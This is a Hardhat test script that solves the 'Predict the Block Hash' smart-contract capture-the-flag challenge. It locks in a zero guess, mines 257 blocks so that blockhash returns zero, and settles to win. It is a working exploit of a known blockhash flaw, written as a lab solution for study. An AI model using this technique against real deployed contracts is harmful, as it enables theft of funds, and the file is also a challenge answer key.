const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Predict Block Hash Challenge", function () {
  let challengeContract;

  beforeEach(async function () {
    const Challenge = await ethers.getContractFactory(
      "PredictTheBlockHashChallenge"
    );
    challengeContract = await Challenge.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await challengeContract.deployed();
  });

  it("should solve PredictTheBlockHashChallenge", async function () {
    // Call lockInGuess() with a value of 0x0000000000000000000000000000000000000000000000000000000000000000
    await challengeContract.lockInGuess(
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      {
        value: ethers.utils.parseEther("1"),
      }
    );
    // Wait for 257 blocks to be mined
    for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine");
    }
    // Call settle()
    await challengeContract.settle();
    // Check if the challenge is complete
    const isComplete = await challengeContract.isComplete();
    expect(isComplete).to.be.true;
  });
});
